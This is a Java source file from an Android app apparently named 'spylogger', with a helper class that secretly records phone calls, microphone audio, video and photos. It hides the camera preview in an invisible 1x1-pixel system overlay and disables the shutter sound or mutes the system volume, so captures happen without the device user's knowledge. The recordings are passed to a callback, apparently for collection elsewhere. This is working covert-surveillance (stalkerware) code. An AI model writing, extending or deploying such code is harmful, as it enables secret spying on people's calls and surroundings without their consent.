package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.gravatasufoca.spylogger.utils.Utils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 20/11/16.
 */

@Getter
@Setter
public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener, SurfaceHolder.Callback, Camera.PictureCallback {

    public final int MEDIA_TYPE_IMAGE = 1;
    public final int MEDIA_TYPE_VIDEO = 2;
    public final int MEDIA_TYPE_AUDIO = 3;

    private Context context;
    private MediaRecorder recorder;
    private File recordedFile;
    private boolean ligacao;
    private int maxDuration;
    private boolean recording;
    private long duration;
    private Date inicio;
    private TaskComplete callback;
    private boolean frontCamera;
    private Camera mCamera;
    private SurfaceHolder mHolder;
    private SurfaceView preview;
    private boolean isPreviewing;
    private boolean startCommand;
    private WindowManager wm;
    private TipoRecordedMidia tipoMidia;
    private byte[] fileBytes;
    private int tentativas = 0;

    public enum TipoRecordedMidia {
        AUDIO, VIDEO, IMAGE;
    }

    public MediaRecorderHelper(Context context, TipoRecordedMidia tipoRecordedMidia) throws IOException {
        this.context = context;
        this.tipoMidia = tipoRecordedMidia;
    }

    private void prepareAudio() throws IOException {
        recordedFile = getOutputMediaFile(MEDIA_TYPE_AUDIO); //File.createTempFile("record", ".mp4", context.getCacheDir());

        if (ligacao) {
            try {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setAudioSamplingRate(96000);
                recorder.setOnInfoListener(this);

                recorder.prepare();

            } catch (IOException e) {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setAudioSamplingRate(96000);
                recorder.setOnInfoListener(this);

                recorder.prepare();
            }
        } else {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
            recorder.setOutputFile(recordedFile.getAbsolutePath());
            recorder.setMaxDuration(maxDuration);
            recorder.setAudioSamplingRate(96000);
            recorder.setOnInfoListener(this);

            recorder.prepare();
        }
        start();

        recording = false;
    }

    private void prepareSurface() {
        preview = new SurfaceView(context);
        mHolder = preview.getHolder();
        mHolder.addCallback(this);

        mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, //Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                0,
                //Don't know if this is a safe default
                PixelFormat.UNKNOWN);

        //Don't set the preview visibility to GONE or INVISIBLE
        wm.addView(preview, params);
        mCamera = getCamera();
        CamcorderProfile camcorderProfile = CamcorderProfile.get(CamcorderProfile.QUALITY_480P);  //get your own profile
        Camera.Parameters parameters = mCamera.getParameters();
        parameters.setPreviewSize(camcorderProfile.videoFrameWidth, camcorderProfile.videoFrameHeight);
        mCamera.setParameters(parameters);
    }

    @SuppressWarnings("deprecation")
    private void prepareVideo() throws IOException {
        recordedFile = getOutputMediaFile(MEDIA_TYPE_VIDEO); //File.createTempFile("record", ".mp4", context.getCacheDir());

        recorder = new MediaRecorder();

        // Step 1: Unlock and set camera to MediaRecorder
        mCamera.unlock();
        recorder.setCamera(mCamera);

        // Step 2: Set sources
        recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);

        // Step 3: Set a CamcorderProfile (requires API Level 8 or higher)
        recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));

        /*recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);*/
        recorder.setOrientationHint(270);


        // Step 4: Set output file
        recorder.setOutputFile(recordedFile.getAbsolutePath());

        // Step 5: Set the preview output
        recorder.setPreviewDisplay(mHolder.getSurface());

        recorder.setMaxDuration(maxDuration > 30000 ? 30000 : maxDuration);
        recorder.setOnInfoListener(this);

        try {
            recorder.prepare();
        } catch (Exception e) {
            isPreviewing = false;
            throw new IOException(e);
        }
    }

    public void takePicture() {

        if (TipoRecordedMidia.IMAGE == tipoMidia) {
            startCommand = true;

            if (mCamera == null) {
                prepareSurface();
            }

            if (isPreviewing) {
                Log.d("spylogger - ini: ", new Date().toString());
                new AsyncTask<Object, Object, Object>() {
                    @Override
                    protected Object doInBackground(Object... objects) {
                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                        }
                        Log.d("spylogger - fim: ", new Date().toString());
                        inicio = new Date();
                        mCamera.takePicture(null, null, MediaRecorderHelper.this);
                        return null;
                    }
                }.execute();
            }
        }
    }

    private Camera getCamera() {
        if (mCamera == null) {
            mCamera = Camera.open(frontCamera ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
        }
        if (mCamera != null) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
                mCamera.enableShutterSound(false);

            } else {
                AudioManager audio = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                audio.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
            }
        }
        return mCamera;
    }

    private void releaseMediaRecorder() {

        /*Thread t = new Thread(new Runnable() {
            @Override
            public void run() {*/
                if (recorder != null) {
                    if (isRecording()) {
                        Log.i("MEDIA", "parando...");
                        recorder.stop();
                        Log.i("MEDIA", "parou");
                    }
                    Log.i("MEDIA", "limpando...");
                    recorder.reset();   // clear recorder configuration
                    recorder.release(); // release the recorder object
                    Log.i("MEDIA", "limpou");
                    recorder = null;
//            mCamera.lock();           // lock camera for later use
                }
           /* }
        });
        t.start();*/

        if (mCamera != null) {
            mCamera.stopPreview();
            mCamera.release();
            wm.removeView(preview);
        }
    }

    private boolean isVideo() {
        return TipoRecordedMidia.VIDEO == tipoMidia;
    }

    public void start() throws IOException {
        if (TipoRecordedMidia.IMAGE == tipoMidia) {
            return;
        }

        startCommand = true;
        if (recorder == null) {
            if (!isVideo()) {
                prepareAudio();
            } else {
                prepareSurface();
            }
        } else {
            try {
                Thread.sleep(2000);
                if (!isVideo()) {
                    recorder.start();
                } else {
                    if (isPreviewing) {
                        recorder.start();
                    }
                }
                inicio = new Date();
            } catch (Exception e) {
                tentativas++;
                if (tentativas <= 3) {
                    releaseMediaRecorder();
                    recorder = null;
                    start();
                } else {
                    tentativas = 0;
                    stop();
                }
                e.printStackTrace();
            }

        }
        duration = 0;

        recording = true;
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {

        }
    }

    public void stop() {
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
        }
        releaseMediaRecorder();
        if (inicio != null) {
            duration = ((inicio.getTime() - (new Date()).getTime()) / 1000);
        }
        recording = false;
        isPreviewing = false;
        if (callback != null) {
            if (recordedFile != null) {
                callback.onFinish(Utils.getBytesFromFile(recordedFile));
            }
            if (fileBytes != null) {
                callback.onFinish(fileBytes);
            }
        }
    }

    @Override
    public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
            recording = false;
            stop();
        }
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            mCamera.setPreviewDisplay(holder);
            mCamera.startPreview();
            isPreviewing = true;
            if (isVideo()) {
                prepareVideo();
            }
            if (startCommand) {
                if (isVideo()) {
                    start();
                } else {
                    takePicture();
                }
            }
        } catch (Exception e) {
            isPreviewing = false;
            Log.d("SPYLOGGER", "Error setting camera preview: " + e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        // If your preview can change or rotate, take care of those events here.
        // Make sure to stop the preview before resizing or reformatting it.

        if (mHolder.getSurface() == null) {
            // preview surface does not exist
            return;
        }

        // stop preview before making changes
        try {
            mCamera.stopPreview();
        } catch (Exception e) {
            // ignore: tried to stop a non-existent preview
        }

        // set preview size and make any resize, rotate or
        // reformatting changes here

        // start preview with new settings
        try {
            mCamera.setPreviewDisplay(mHolder);
            mCamera.startPreview();

        } catch (Exception e) {
            Log.d("SPYLOGGER", "Error starting camera preview: " + e.getMessage());
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    private boolean checkCameraHardware(Context context) {
        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            // this device has a camera
            return true;
        } else {
            // no camera on this device
            return false;
        }
    }

    private File getOutputMediaFile(int type) {
        // To be safe, you should check that the SDCard is mounted
        // using Environment.getExternalStorageState() before doing this.

        File mediaStorageDir = Environment.getExternalStorageDirectory();//new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "MyCameraApp");

        // This location works best if you want the created images to be shared
        // between applications and persist after your app has been uninstalled.

        // Create the storage directory if it does not exist
        if (!mediaStorageDir.exists()) {
            if (!mediaStorageDir.mkdirs()) {
                Log.d("MyCameraApp", "failed to create directory");
                return null;
            }
        }

        // Create a media file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File mediaFile;
        if (type == MEDIA_TYPE_IMAGE) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                    "IMG_" + timeStamp + ".jpg");
        } else if (type == MEDIA_TYPE_VIDEO) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                    "VID_" + timeStamp + ".mp4");
        } else if (type == MEDIA_TYPE_AUDIO) {
            mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                    "AUD_" + timeStamp + ".mp4");
        } else {
            return null;
        }

        return mediaFile;
    }

    @Override
    public void onError(MediaRecorder mediaRecorder, int what, int extra) {
        stop();
        Log.d("SPYLOGGER", "Erro na gravacao de video: !!!!!!!!!!!!!!!!!!");

    }

    @Override
    public void onPictureTaken(byte[] bytes, Camera camera) {
        fileBytes = bytes;
        stop();
        Log.d("SPYLOGGER", "onPictureTake: !!!!!!!!!!!!!!!!!!");
    }

    public void setMaxDuration(int maxDuration) {
        this.maxDuration = maxDuration * 1000;
    }

}
